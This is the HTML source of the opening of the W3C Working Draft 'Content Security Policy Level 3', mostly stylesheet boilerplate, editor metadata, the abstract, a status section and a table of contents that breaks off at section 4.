<!doctype html><html lang="en">
 <head>
  <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
  <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport">
  <title>Content Security Policy Level 3</title>
  <meta content="WD" name="w3c-status">
  <link href="https://www.w3.org/StyleSheets/TR/2021/W3C-WD" rel="stylesheet">
  <link href="https://www.w3.org/TR/CSP3/" rel="canonical">
  <meta content="dark light" name="color-scheme">
  <link href="https://www.w3.org/StyleSheets/TR/2021/dark.css" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css">
<style>
  ul.toc ul ul ul {
    margin: 0 0 0 2em;
  }
  ul.toc ul ul ul span.secno {
    margin-left: -9em;
  }

  a[href^="http:"]:after {
    color: red;
    content: "🔓";
  }

  .wip {
    margin: 1em auto;

    background: #FCFAEE;
    border: 0.5em;
    border-left-style: solid;
    border-color: #E0CB52;
    padding: 0.5em;
  }

  .wip::before {
    content: "Work In Progress: ";
    display: block;
    color: #827017;
  }
  section.wip {
    padding-left: 2em;
  }

</style>
<style>/* Boilerplate: style-autolinks */
.css.css, .property.property, .descriptor.descriptor {
    color: var(--a-normal-text);
    font-size: inherit;
    font-family: inherit;
}
.css::before, .property::before, .descriptor::before {
    content: "‘";
}
.css::after, .property::after, .descriptor::after {
    content: "’";
}
.property, .descriptor {
    /* Don't wrap property and descriptor names */
    white-space: nowrap;
}
.type { /* CSS value <type> */
    font-style: italic;
}
pre .property::before, pre .property::after {
    content: "";
}
[data-link-type="property"]::before,
[data-link-type="propdesc"]::before,
[data-link-type="descriptor"]::before,
[data-link-type="value"]::before,
[data-link-type="function"]::before,
[data-link-type="at-rule"]::before,
[data-link-type="selector"]::before,
[data-link-type="maybe"]::before {
    content: "‘";
}
[data-link-type="property"]::after,
[data-link-type="propdesc"]::after,
[data-link-type="descriptor"]::after,
[data-link-type="value"]::after,
[data-link-type="function"]::after,
[data-link-type="at-rule"]::after,
[data-link-type="selector"]::after,
[data-link-type="maybe"]::after {
    content: "’";
}

[data-link-type].production::before,
[data-link-type].production::after,
.prod [data-link-type]::before,
.prod [data-link-type]::after {
    content: "";
}

[data-link-type=element],
[data-link-type=element-attr] {
    font-family: Menlo, Consolas, "DejaVu Sans Mono", monospace;
    font-size: .9em;
}
[data-link-type=element]::before { content: "<" }
[data-link-type=element]::after  { content: ">" }

[data-link-type=biblio] {
    white-space: pre;
}

@media (prefers-color-scheme: dark) {
    :root {
        --selflink-text: black;
        --selflink-bg: silver;
        --selflink-hover-text: white;
    }
}
</style>
<style>/* Boilerplate: style-colors */
/* Any --*-text not paired with a --*-bg is assumed to have a transparent bg */
:root {
    color-scheme: light dark;

    --text: black;
    --bg: white;

    --unofficial-watermark: url(https://www.w3.org/StyleSheets/TR/2016/logos/UD-watermark);

    --logo-bg: #1a5e9a;
    --logo-active-bg: #c00;
    --logo-text: white;

    --tocnav-normal-text: #707070;
    --tocnav-normal-bg: var(--bg);
    --tocnav-hover-text: var(--tocnav-normal-text);
    --tocnav-hover-bg: #f8f8f8;
    --tocnav-active-text: #c00;
    --tocnav-active-bg: var(--tocnav-normal-bg);

    --tocsidebar-text: var(--text);
    --tocsidebar-bg: #f7f8f9;
    --tocsidebar-shadow: rgba(0,0,0,.1);
    --tocsidebar-heading-text: hsla(203,20%,40%,.7);

    --toclink-text: var(--text);
    --toclink-underline: #3980b5;
    --toclink-visited-text: var(--toclink-text);
    --toclink-visited-underline: #054572;

    --heading-text: #005a9c;

    --hr-text: var(--text);

    --algo-border: #def;

    --del-text: red;
    --del-bg: transparent;
    --ins-text: #080;
    --ins-bg: transparent;

    --a-normal-text: #034575;
    --a-normal-underline: #bbb;
    --a-visited-text: var(--a-normal-text);
    --a-visited-underline: #707070;
    --a-hover-bg: rgba(75%, 75%, 75%, .25);
    --a-active-text: #c00;
    --a-active-underline: #c00;

    --blockquote-border: silver;
    --blockquote-bg: transparent;
    --blockquote-text: currentcolor;

    --issue-border: #e05252;
    --issue-bg: #fbe9e9;
    --issue-text: var(--text);
    --issueheading-text: #831616;

    --example-border: #e0cb52;
    --example-bg: #fcfaee;
    --example-text: var(--text);
    --exampleheading-text: #574b0f;

    --note-border: #52e052;
    --note-bg: #e9fbe9;
    --note-text: var(--text);
    --noteheading-text: hsl(120, 70%, 30%);
    --notesummary-underline: silver;

    --assertion-border: #aaa;
    --assertion-bg: #eee;
    --assertion-text: black;

    --advisement-border: orange;
    --advisement-bg: #fec;
    --advisement-text: var(--text);
    --advisementheading-text: #b35f00;

    --warning-border: red;
    --warning-bg: hsla(40,100%,50%,0.95);
    --warning-text: var(--text);

    --amendment-border: #330099;
    --amendment-bg: #F5F0FF;
    --amendment-text: var(--text);
    --amendmentheading-text: #220066;

    --def-border: #8ccbf2;
    --def-bg: #def;
    --def-text: var(--text);
    --defrow-border: #bbd7e9;

    --datacell-border: silver;

    --indexinfo-text: #707070;

    --indextable-hover-text: black;
    --indextable-hover-bg: #f7f8f9;

    --outdatedspec-bg: rgba(0, 0, 0, .5);
    --outdatedspec-text: black;
    --outdated-bg: maroon;
    --outdated-text: white;
    --outdated-shadow: red;

    --editedrec-bg: darkorange;
}

@media (prefers-color-scheme: dark) {
    :root {
        --text: #ddd;
        --bg: black;

        --unofficial-watermark: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='400'%3E%3Cg fill='%23100808' transform='translate(200 200) rotate(-45) translate(-200 -200)' stroke='%23100808' stroke-width='3'%3E%3Ctext x='50%25' y='220' style='font: bold 70px sans-serif; text-anchor: middle; letter-spacing: 6px;'%3EUNOFFICIAL%3C/text%3E%3Ctext x='50%25' y='305' style='font: bold 70px sans-serif; text-anchor: middle; letter-spacing: 6px;'%3EDRAFT%3C/text%3E%3C/g%3E%3C/svg%3E");

        --logo-bg: #1a5e9a;
        --logo-active-bg: #c00;
        --logo-text: white;

        --tocnav-normal-text: #999;
        --tocnav-normal-bg: var(--bg);
        --tocnav-hover-text: var(--tocnav-normal-text);
        --tocnav-hover-bg: #080808;
        --tocnav-active-text: #f44;
        --tocnav-active-bg: var(--tocnav-normal-bg);

        --tocsidebar-text: var(--text);
        --tocsidebar-bg: #080808;
        --tocsidebar-shadow: rgba(255,255,255,.1);
        --tocsidebar-heading-text: hsla(203,20%,40%,.7);

        --toclink-text: var(--text);
        --toclink-underline: #6af;
        --toclink-visited-text: var(--toclink-text);
        --toclink-visited-underline: #054572;

        --heading-text: #8af;

        --hr-text: var(--text);

        --algo-border: #456;

        --del-text: #f44;
        --del-bg: transparent;
        --ins-text: #4a4;
        --ins-bg: transparent;

        --a-normal-text: #6af;
        --a-normal-underline: #555;
        --a-visited-text: var(--a-normal-text);
        --a-visited-underline: var(--a-normal-underline);
        --a-hover-bg: rgba(25%, 25%, 25%, .2);
        --a-active-text: #f44;
        --a-active-underline: var(--a-active-text);

        --borderedblock-bg: rgba(255, 255, 255, .05);

        --blockquote-border: silver;
        --blockquote-bg: var(--borderedblock-bg);
        --blockquote-text: currentcolor;

        --issue-border: #e05252;
        --issue-bg: var(--borderedblock-bg);
        --issue-text: var(--text);
        --issueheading-text: hsl(0deg, 70%, 70%);

        --example-border: hsl(50deg, 90%, 60%);
        --example-bg: var(--borderedblock-bg);
        --example-text: var(--text);
        --exampleheading-text: hsl(50deg, 70%, 70%);

        --note-border: hsl(120deg, 100%, 35%);
        --note-bg: var(--borderedblock-bg);
        --note-text: var(--text);
        --noteheading-text: hsl(120, 70%, 70%);
        --notesummary-underline: silver;

        --assertion-border: #444;
        --assertion-bg: var(--borderedblock-bg);
        --assertion-text: var(--text);

        --advisement-border: orange;
        --advisement-bg: #222218;
        --advisement-text: var(--text);
        --advisementheading-text: #f84;

        --warning-border: red;
        --warning-bg: hsla(40,100%,20%,0.95);
        --warning-text: var(--text);

        --amendment-border: #330099;
        --amendment-bg: #080010;
        --amendment-text: var(--text);
        --amendmentheading-text: #cc00ff;

        --def-border: #8ccbf2;
        --def-bg: #080818;
        --def-text: var(--text);
        --defrow-border: #136;

        --datacell-border: silver;

        --indexinfo-text: #aaa;

        --indextable-hover-text: var(--text);
        --indextable-hover-bg: #181818;

        --outdatedspec-bg: rgba(255, 255, 255, .5);
        --outdatedspec-text: black;
        --outdated-bg: maroon;
        --outdated-text: white;
        --outdated-shadow: red;

        --editedrec-bg: darkorange;
    }
    /* In case a transparent-bg image doesn't expect to be on a dark bg,
       which is quite common in practice... */
    img { background: white; }
}
</style>
<style>/* Boilerplate: style-counters */
body {
    counter-reset: example figure issue;
}
.issue {
    counter-increment: issue;
}
.issue:not(.no-marker)::before {
    content: "Issue " counter(issue);
}

.example {
    counter-increment: example;
}
.example:not(.no-marker)::before {
    content: "Example " counter(example);
}
.invalid.example:not(.no-marker)::before,
.illegal.example:not(.no-marker)::before {
    content: "Invalid Example" counter(example);
}

figcaption {
    counter-increment: figure;
}
figcaption:not(.no-marker)::before {
    content: "Figure " counter(figure) " ";
}
</style>
<style>/* Boilerplate: style-dfn-panel */
:root {
    --dfnpanel-bg: #ddd;
    --dfnpanel-text: var(--text);
    --dfnpanel-target-bg: #ffc;
    --dfnpanel-target-outline: orange;
}
@media (prefers-color-scheme: dark) {
    :root {
        --dfnpanel-bg: #222;
        --dfnpanel-text: var(--text);
        --dfnpanel-target-bg: #333;
        --dfnpanel-target-outline: silver;
    }
}
.dfn-panel {
    position: absolute;
    z-index: 35;
    width: 20em;
    width: 300px;
    height: auto;
    max-height: 500px;
    overflow: auto;
    padding: 0.5em 0.75em;
    font: small Helvetica Neue, sans-serif, Droid Sans Fallback;
    background: var(--dfnpanel-bg);
    color: var(--dfnpanel-text);
    border: outset 0.2em;
    white-space: normal; /* in case it's moved into a pre */
}
.dfn-panel:not(.on) { display: none; }
.dfn-panel * { margin: 0; padding: 0; text-indent: 0; }
.dfn-panel > b { display: block; }
.dfn-panel a { color: var(--dfnpanel-text); }
.dfn-panel a:not(:hover) { text-decoration: none !important; border-bottom: none !important; }
.dfn-panel a:focus {
    outline: 5px auto Highlight;
    outline: 5px auto -webkit-focus-ring-color;
}
.dfn-panel > b + b { margin-top: 0.25em; }
.dfn-panel ul { padding: 0 0 0 1em; list-style: none; }
.dfn-panel li a {
    max-width: calc(300px - 1.5em - 1em);
    overflow: hidden;
    text-overflow: ellipsis;
}

.dfn-panel.activated {
    display: inline-block;
    position: fixed;
    left: 8px;
    bottom: 2em;
    margin: 0 auto;
    max-width: calc(100vw - 1.5em - .4em - .5em);
    max-height: 30vh;
    transition: left 1s ease-out, bottom 1s ease-out;
}

.dfn-panel .link-item:hover {
    text-decoration: underline;
}
.dfn-panel .link-item .copy-icon {
    opacity: 0;
}
.dfn-panel .link-item:hover .copy-icon,
.dfn-panel .link-item .copy-icon:focus {
    opacity: 1;
}

.dfn-panel .copy-icon {
    display: inline-block;
    margin-right: 0.5em;
    width: 0.85em;
    height: 1em;
    border-radius: 3px;
    background-color: #ccc;
    cursor: pointer;
}

.dfn-panel .copy-icon .icon {
    width: 100%;
    height: 100%;
    background-color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
}

.dfn-panel .copy-icon .icon::before {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border: 1px solid black;
    background-color: #ccc;
    opacity: 0.25;
    transform: translate(3px, -3px);
}

.dfn-panel .copy-icon:active .icon::before {
    opacity: 1;
}

.dfn-paneled[role="button"] { cursor: help; }

.highlighted {
    animation: target-fade 3s;
}

@keyframes target-fade {
    from {
        background-color: var(--dfnpanel-target-bg);
        outline: 5px solid var(--dfnpanel-target-outline);
    }
    to {
        color: var(--a-normal-text);
        background-color: transparent;
        outline: transparent;
    }
}
</style>
<style>/* Boilerplate: style-idl-highlighting */
pre.idl.highlight {
    background: var(--borderedblock-bg, var(--def-bg));
}
</style>
<style>/* Boilerplate: style-issues */
a[href].issue-return {
    float: right;
    float: inline-end;
    color: var(--issueheading-text);
    font-weight: bold;
    text-decoration: none;
}
</style>
<style>/* Boilerplate: style-md-lists */
/* This is a weird hack for me not yet following the commonmark spec
   regarding paragraph and lists. */
[data-md] > :first-child {
    margin-top: 0;
}
[data-md] > :last-child {
    margin-bottom: 0;
}
</style>
<style>/* Boilerplate: style-ref-hints */
:root {
    --ref-hint-bg: #ddd;
    --ref-hint-text: var(--text);
}
@media (prefers-color-scheme: dark) {
    :root {
        --ref-hint-bg: #222;
        --ref-hint-text: var(--text);
    }
}

.ref-hint {
    display: inline-block;
    position: absolute;
    z-index: 35;
    width: 20em;
    width: 300px;
    height: auto;
    max-height: 500px;
    overflow: auto;
    padding: 0.5em 0.5em;
    font: small Helvetica Neue, sans-serif, Droid Sans Fallback;
    background: var(--ref-hint-bg);
    color: var(--ref-hint-text);
    border: outset 0.2em;
    white-space: normal; /* in case it's moved into a pre */
}

.ref-hint * { margin: 0; padding: 0; text-indent: 0; }

.ref-hint ul { padding: 0 0 0 1em; list-style: none; }
</style>
<style>/* Boilerplate: style-selflinks */
:root {
    --selflink-text: white;
    --selflink-bg: gray;
    --selflink-hover-text: black;
}
.heading, .issue, .note, .example, li, dt {
    position: relative;
}
a.self-link {
    position: absolute;
    top: 0;
    left: calc(-1 * (3.5rem - 26px));
    width: calc(3.5rem - 26px);
    height: 2em;
    text-align: center;
    border: none;
    transition: opacity .2s;
    opacity: .5;
}
a.self-link:hover {
    opacity: 1;
}
.heading > a.self-link {
    font-size: 83%;
}
.example > a.self-link,
.note > a.self-link,
.issue > a.self-link {
    /* These blocks are overflow:auto, so positioning outside
       doesn't work. */
    left: auto;
    right: 0;
}
li > a.self-link {
    left: calc(-1 * (3.5rem - 26px) - 2em);
}
dfn > a.self-link {
    top: auto;
    left: auto;
    opacity: 0;
    width: 1.5em;
    height: 1.5em;
    background: var(--selflink-bg);
    color: var(--selflink-text);
    font-style: normal;
    transition: opacity .2s, background-color .2s, color .2s;
}
dfn:hover > a.self-link {
    opacity: 1;
}
dfn > a.self-link:hover {
    color: var(--selflink-hover-text);
}

a.self-link::before            { content: "¶"; }
.heading > a.self-link::before { content: "§"; }
dfn > a.self-link::before      { content: "#"; }
</style>
<style>/* Boilerplate: style-syntax-highlighting */
code.highlight { padding: .1em; border-radius: .3em; }
pre.highlight, pre > code.highlight { display: block; padding: 1em; margin: .5em 0; overflow: auto; border-radius: 0; }

.highlight:not(.idl) { background: rgba(0, 0, 0, .03); }
c-[a] { color: #990055 } /* Keyword.Declaration */
c-[b] { color: #990055 } /* Keyword.Type */
c-[c] { color: #708090 } /* Comment */
c-[d] { color: #708090 } /* Comment.Multiline */
c-[e] { color: #0077aa } /* Name.Attribute */
c-[f] { color: #669900 } /* Name.Tag */
c-[g] { color: #222222 } /* Name.Variable */
c-[k] { color: #990055 } /* Keyword */
c-[l] { color: #000000 } /* Literal */
c-[m] { color: #000000 } /* Literal.Number */
c-[n] { color: #0077aa } /* Name */
c-[o] { color: #999999 } /* Operator */
c-[p] { color: #999999 } /* Punctuation */
c-[s] { color: #a67f59 } /* Literal.String */
c-[t] { color: #a67f59 } /* Literal.String.Single */
c-[u] { color: #a67f59 } /* Literal.String.Double */
c-[cp] { color: #708090 } /* Comment.Preproc */
c-[c1] { color: #708090 } /* Comment.Single */
c-[cs] { color: #708090 } /* Comment.Special */
c-[kc] { color: #990055 } /* Keyword.Constant */
c-[kn] { color: #990055 } /* Keyword.Namespace */
c-[kp] { color: #990055 } /* Keyword.Pseudo */
c-[kr] { color: #990055 } /* Keyword.Reserved */
c-[ld] { color: #000000 } /* Literal.Date */
c-[nc] { color: #0077aa } /* Name.Class */
c-[no] { color: #0077aa } /* Name.Constant */
c-[nd] { color: #0077aa } /* Name.Decorator */
c-[ni] { color: #0077aa } /* Name.Entity */
c-[ne] { color: #0077aa } /* Name.Exception */
c-[nf] { color: #0077aa } /* Name.Function */
c-[nl] { color: #0077aa } /* Name.Label */
c-[nn] { color: #0077aa } /* Name.Namespace */
c-[py] { color: #0077aa } /* Name.Property */
c-[ow] { color: #999999 } /* Operator.Word */
c-[mb] { color: #000000 } /* Literal.Number.Bin */
c-[mf] { color: #000000 } /* Literal.Number.Float */
c-[mh] { color: #000000 } /* Literal.Number.Hex */
c-[mi] { color: #000000 } /* Literal.Number.Integer */
c-[mo] { color: #000000 } /* Literal.Number.Oct */
c-[sb] { color: #a67f59 } /* Literal.String.Backtick */
c-[sc] { color: #a67f59 } /* Literal.String.Char */
c-[sd] { color: #a67f59 } /* Literal.String.Doc */
c-[se] { color: #a67f59 } /* Literal.String.Escape */
c-[sh] { color: #a67f59 } /* Literal.String.Heredoc */
c-[si] { color: #a67f59 } /* Literal.String.Interpol */
c-[sx] { color: #a67f59 } /* Literal.String.Other */
c-[sr] { color: #a67f59 } /* Literal.String.Regex */
c-[ss] { color: #a67f59 } /* Literal.String.Symbol */
c-[vc] { color: #0077aa } /* Name.Variable.Class */
c-[vg] { color: #0077aa } /* Name.Variable.Global */
c-[vi] { color: #0077aa } /* Name.Variable.Instance */
c-[il] { color: #000000 } /* Literal.Number.Integer.Long */

@media (prefers-color-scheme: dark) {
    .highlight:not(.idl) { background: rgba(255, 255, 255, .05); }

    c-[a] { color: #d33682 } /* Keyword.Declaration */
    c-[b] { color: #d33682 } /* Keyword.Type */
    c-[c] { color: #2aa198 } /* Comment */
    c-[d] { color: #2aa198 } /* Comment.Multiline */
    c-[e] { color: #268bd2 } /* Name.Attribute */
    c-[f] { color: #b58900 } /* Name.Tag */
    c-[g] { color: #cb4b16 } /* Name.Variable */
    c-[k] { color: #d33682 } /* Keyword */
    c-[l] { color: #657b83 } /* Literal */
    c-[m] { color: #657b83 } /* Literal.Number */
    c-[n] { color: #268bd2 } /* Name */
    c-[o] { color: #657b83 } /* Operator */
    c-[p] { color: #657b83 } /* Punctuation */
    c-[s] { color: #6c71c4 } /* Literal.String */
    c-[t] { color: #6c71c4 } /* Literal.String.Single */
    c-[u] { color: #6c71c4 } /* Literal.String.Double */
    c-[ch] { color: #2aa198 } /* Comment.Hashbang */
    c-[cp] { color: #2aa198 } /* Comment.Preproc */
    c-[cpf] { color: #2aa198 } /* Comment.PreprocFile */
    c-[c1] { color: #2aa198 } /* Comment.Single */
    c-[cs] { color: #2aa198 } /* Comment.Special */
    c-[kc] { color: #d33682 } /* Keyword.Constant */
    c-[kn] { color: #d33682 } /* Keyword.Namespace */
    c-[kp] { color: #d33682 } /* Keyword.Pseudo */
    c-[kr] { color: #d33682 } /* Keyword.Reserved */
    c-[ld] { color: #657b83 } /* Literal.Date */
    c-[nc] { color: #268bd2 } /* Name.Class */
    c-[no] { color: #268bd2 } /* Name.Constant */
    c-[nd] { color: #268bd2 } /* Name.Decorator */
    c-[ni] { color: #268bd2 } /* Name.Entity */
    c-[ne] { color: #268bd2 } /* Name.Exception */
    c-[nf] { color: #268bd2 } /* Name.Function */
    c-[nl] { color: #268bd2 } /* Name.Label */
    c-[nn] { color: #268bd2 } /* Name.Namespace */
    c-[py] { color: #268bd2 } /* Name.Property */
    c-[ow] { color: #657b83 } /* Operator.Word */
    c-[mb] { color: #657b83 } /* Literal.Number.Bin */
    c-[mf] { color: #657b83 } /* Literal.Number.Float */
    c-[mh] { color: #657b83 } /* Literal.Number.Hex */
    c-[mi] { color: #657b83 } /* Literal.Number.Integer */
    c-[mo] { color: #657b83 } /* Literal.Number.Oct */
    c-[sa] { color: #6c71c4 } /* Literal.String.Affix */
    c-[sb] { color: #6c71c4 } /* Literal.String.Backtick */
    c-[sc] { color: #6c71c4 } /* Literal.String.Char */
    c-[dl] { color: #6c71c4 } /* Literal.String.Delimiter */
    c-[sd] { color: #6c71c4 } /* Literal.String.Doc */
    c-[se] { color: #6c71c4 } /* Literal.String.Escape */
    c-[sh] { color: #6c71c4 } /* Literal.String.Heredoc */
    c-[si] { color: #6c71c4 } /* Literal.String.Interpol */
    c-[sx] { color: #6c71c4 } /* Literal.String.Other */
    c-[sr] { color: #6c71c4 } /* Literal.String.Regex */
    c-[ss] { color: #6c71c4 } /* Literal.String.Symbol */
    c-[fm] { color: #268bd2 } /* Name.Function.Magic */
    c-[vc] { color: #cb4b16 } /* Name.Variable.Class */
    c-[vg] { color: #cb4b16 } /* Name.Variable.Global */
    c-[vi] { color: #cb4b16 } /* Name.Variable.Instance */
    c-[vm] { color: #cb4b16 } /* Name.Variable.Magic */
    c-[il] { color: #657b83 } /* Literal.Number.Integer.Long */
}
</style>
<style>/* Boilerplate: style-var-click-highlighting */
/*
Colors were chosen in Lab using https://nixsensor.com/free-color-converter/
D50 2deg illuminant, L in [0,100], a and b in [-128, 128]
0 = lab(85,0,85)
1 = lab(85,80,30)
2 = lab(85,-40,40)
3 = lab(85,-50,0)
4 = lab(85,5,15)
5 = lab(85,-10,-50)
6 = lab(85,35,-15)

For darkmode:
0 = oklab(50%   0%  108%)
1 = oklab(50% -51%   51%)
2 = oklab(50% -64%  -20%)
3 = oklab(50%   6%   19%)
4 = oklab(50% -12%  -64%)
5 = oklab(50%  44%  -19%)  
6 = oklab(50% 102%   38%)
*/

[data-algorithm] var { cursor: pointer; }
var[data-var-color] { background-color: var(--var-bg); box-shadow: 0 0 0 2px var(--var-bg); }

var[data-var-color] { --var-bg: #F4D200; }
var[data-var-color="1"] { --var-bg: #FF87A2; }
var[data-var-color="2"] { --var-bg: #96E885; }
var[data-var-color="3"] { --var-bg: #3EEED2; }
var[data-var-color="4"] { --var-bg: #EACFB6; }
var[data-var-color="5"] { --var-bg: #82DDFF; }
var[data-var-color="6"] { --var-vg: #FFBCF2; }

@media (prefers-color-scheme: dark) {
	var[data-var-color] { --var-bg: #bc1a00; }
	var[data-var-color="1"] { --var-bg: #007f00; }
	var[data-var-color="2"] { --var-bg: #008698; }
	var[data-var-color="3"] { --var-bg: #7f5b2b; }
	var[data-var-color="4"] { --var-bg: #004df3; }
	var[data-var-color="5"] { --var-bg: #a1248a; }
	var[data-var-color="6"] { --var-vg: #ff0000; }
}
</style>
 <body class="h-entry">
  <div class="head">
   <p data-fill-with="logo"><a class="logo" href="https://www.w3.org/"> <img alt="W3C" height="48" src="https://www.w3.org/StyleSheets/TR/2021/logos/W3C" width="72"> </a> </p>
   <h1>Content Security Policy Level 3</h1>
   <p id="w3c-state"><a href="https://www.w3.org/standards/types#WD">W3C Working Draft</a>, <time class="dt-updated" datetime="1970-01-01">1 January 1970</time></p>
   <details open>
    <summary>More details about this document</summary>
    <div data-fill-with="spec-metadata">
     <dl>
      <dt>This version:
      <dd><a class="u-url" href="https://www.w3.org/TR/1970/WD-CSP3-19700101/">https://www.w3.org/TR/1970/WD-CSP3-19700101/</a>
      <dt>Latest published version:
      <dd><a href="https://www.w3.org/TR/CSP3/">https://www.w3.org/TR/CSP3/</a>
      <dt>Editor's Draft:
      <dd><a href="https://w3c.github.io/webappsec-csp/">https://w3c.github.io/webappsec-csp/</a>
      <dt>History:
      <dd><a class="u-url" href="https://www.w3.org/standards/history/CSP3/">https://www.w3.org/standards/history/CSP3/</a>
      <dt>Feedback:
      <dd><span><a href="mailto:public-webappsec@w3.org?subject=%5BCSP3%5D%20YOUR%20TOPIC%20HERE">public-webappsec@w3.org</a> with subject line “<kbd>[CSP3] <i data-lt>… message topic …</i></kbd>” (<a href="https://lists.w3.org/Archives/Public/public-webappsec/" rel="discussion">archives</a>)</span>
      <dd><a href="https://github.com/w3c/webappsec-csp/issues/new">Github</a>
      <dt class="editor">Editor:
      <dd class="editor p-author h-card vcard" data-editor-id="56384"><a class="p-name fn u-email email" href="mailto:mkwst@google.com">Mike West</a> (<span class="p-org org">Google Inc.</span>)
      <dt>Participate:
      <dd><a href="https://github.com/w3c/webappsec-csp/issues/new">File an issue</a> (<a href="https://github.com/w3c/webappsec-csp/issues">open issues</a>)
      <dt>Tests:
      <dd><a href="https://github.com/web-platform-tests/wpt/tree/master/content-security-policy">web-platform-tests content-security-policy/</a> (<a href="https://github.com/web-platform-tests/wpt/labels/content-security-policy">ongoing work</a>)
     </dl>
    </div>
   </details>
   <div data-fill-with="warning"></div>
   <p class="copyright" data-fill-with="copyright"><a href="https://www.w3.org/policies/#copyright">Copyright</a> © 1970 <a href="https://www.w3.org/">World Wide Web Consortium</a>. <abbr title="World Wide Web Consortium">W3C</abbr><sup>®</sup> <a href="https://www.w3.org/policies/#Legal_Disclaimer">liability</a>, <a href="https://www.w3.org/policies/#W3C_Trademarks">trademark</a> and <a href="https://www.w3.org/copyright/software-license/" rel="license" title="W3C Software and Document License">permissive document license</a> rules apply. </p>
   <hr title="Separator for header">
  </div>
  <div class="p-summary" data-fill-with="abstract">
   <h2 class="no-num no-toc no-ref heading settled" id="abstract"><span class="content">Abstract</span></h2>
   <p>This document defines a mechanism by which web developers can control the
resources which a particular page can fetch or execute, as well as a number
of security-relevant policy decisions.</p>
  </div>
  <h2 class="no-num no-toc no-ref heading settled" id="sotd"><span class="content">Status of this document</span></h2>
  <div data-fill-with="status">
   <p> <em>This section describes the status of this document at the time of
  its publication. A list of
  current W3C publications and the latest revision of this technical report
  can be found in the <a href="https://www.w3.org/TR/">W3C technical reports
  index at https://www.w3.org/TR/.</a></em> </p>
   <p> This document was published by the <a href="https://www.w3.org/groups/wg/webappsec">Web Application Security Working Group</a> as a Working Draft using the <a href="https://www.w3.org/policies/process/20231103/#recs-and-notes">Recommendation
      track</a>. This document is intended to become a W3C Recommendation. </p>
   <p> The (<a href="https://lists.w3.org/Archives/Public/public-webappsec/">archived</a>) public mailing list <a href="mailto:public-webappsec@w3.org?Subject=%5BCSP3%5D%20PUT%20SUBJECT%20HERE">public-webappsec@w3.org</a> (see <a href="https://www.w3.org/Mail/Request">instructions</a>)
	is preferred for discussion of this specification.
	When sending e-mail,
	please put the text “CSP3” in the subject,
	preferably like this:
	“[CSP3] <em>…summary of comment…</em>” </p>
   <p> Publication as a Working Draft does not imply endorsement by <abbr title="World Wide Web Consortium">W3C</abbr> and its Members. This is a draft document and may be updated, replaced or
  obsoleted by other documents at any time. It is inappropriate to cite this
  document as other than work in progress. </p>
   <p> This document was produced by the <a href="https://www.w3.org/groups/wg/webappsec">Web Application Security Working Group</a>. </p>
   <p> This document was produced by a group operating under
	the <a href="https://www.w3.org/policies/patent-policy/">W3C Patent Policy</a>.
	W3C maintains a <a href="https://www.w3.org/groups/wg/webappsec/ipr" rel="disclosure">public list of any patent disclosures</a> made in connection with the deliverables of the group;
	that page also includes instructions for disclosing a patent.
	An individual who has actual knowledge of a patent which the individual believes contains <a href="https://www.w3.org/policies/patent-policy/#def-essential">Essential Claim(s)</a> must disclose the information in accordance with <a href="https://www.w3.org/policies/patent-policy/#sec-Disclosure">section 6 of the W3C Patent Policy</a>. </p>
   <p> This document is governed by the <a href="https://www.w3.org/policies/process/20231103/" id="w3c_process_revision">03 November 2023 W3C Process Document</a>. </p>
   <p></p>
  </div>
  <div data-fill-with="at-risk">
   <p>The following features are at-risk, and may be dropped during the CR period: </p>
   <ul>
    <li>The <a href="#is-element-nonceable">§ 6.6.3.1 Is element nonceable?</a> algorithm.
   </ul>
   <p>“At-risk” is a W3C Process term-of-art, and does not necessarily imply that the feature is in danger of being dropped or delayed. It means that the WG believes the feature may have difficulty being interoperably implemented in a timely manner, and marking it as such allows the WG to drop the feature if necessary when transitioning to the Proposed Rec stage, without having to publish a new Candidate Rec without the feature first.</p>
  </div>
  <nav data-fill-with="table-of-contents" id="toc">
   <h2 class="no-num no-toc no-ref" id="contents">Table of Contents</h2>
   <ol class="toc" role="directory">
    <li>
     <a href="#intro"><span class="secno">1</span> <span class="content">Introduction</span></a>
     <ol class="toc">
      <li>
       <a href="#examples"><span class="secno">1.1</span> <span class="content">Examples</span></a>
       <ol class="toc">
        <li><a href="#example-basic"><span class="secno">1.1.1</span> <span class="content">Control Execution</span></a>
       </ol>
      <li><a href="#goals"><span class="secno">1.2</span> <span class="content">Goals</span></a>
      <li><a href="#changes-from-level-2"><span class="secno">1.3</span> <span class="content">Changes from Level 2</span></a>
     </ol>
    <li>
     <a href="#framework"><span class="secno">2</span> <span class="content">Framework</span></a>
     <ol class="toc">
      <li><a href="#framework-infrastructure"><span class="secno">2.1</span> <span class="content">Infrastructure</span></a>
      <li>
       <a href="#framework-policy"><span class="secno">2.2</span> <span class="content">Policies</span></a>
       <ol class="toc">
        <li><a href="#parse-serialized-policy"><span class="secno">2.2.1</span> <span class="content"> Parse a serialized CSP </span></a>
        <li><a href="#parse-serialized-policy-list"><span class="secno">2.2.2</span> <span class="content"> Parse a serialized CSP list </span></a>
       </ol>
      <li>
       <a href="#framework-directives"><span class="secno">2.3</span> <span class="content">Directives</span></a>
       <ol class="toc">
        <li><a href="#framework-directive-source-list"><span class="secno">2.3.1</span> <span class="content">Source Lists</span></a>
       </ol>
      <li>
       <a href="#framework-violation"><span class="secno">2.4</span> <span class="content">Violations</span></a>
       <ol class="toc">
        <li><a href="#create-violation-for-global"><span class="secno">2.4.1</span> <span class="content"> Create a violation object for <var>global</var>, <var>policy</var>, and <var>directive</var> </span></a>
        <li><a href="#create-violation-for-request"><span class="secno">2.4.2</span> <span class="content"> Create a violation object for <var>request</var>, and <var>policy</var>. </span></a>
       </ol>
     </ol>
    <li>
     <a href="#policy-delivery"><span class="secno">3</span> <span class="content"> Policy Delivery </span></a>
     <ol class="toc">
      <li><a href="#csp-header"><span class="secno">3.1</span> <span class="content"> The <code>Content-Security-Policy</code> HTTP Response Header Field </span></a>
      <li><a href="#cspro-header"><span class="secno">3.2</span> <span class="content"> The <code>Content-Security-Policy-Report-Only</code> HTTP Response Header Field </span></a>
      <li><a href="#meta-element"><span class="secno">3.3</span> <span class="content"> The <code>&lt;meta></code> element </span></a>
     </ol>
    <li>
     <a href="#integrations"><span class="secno">4</span> <span class="content">Integrations</span></a>
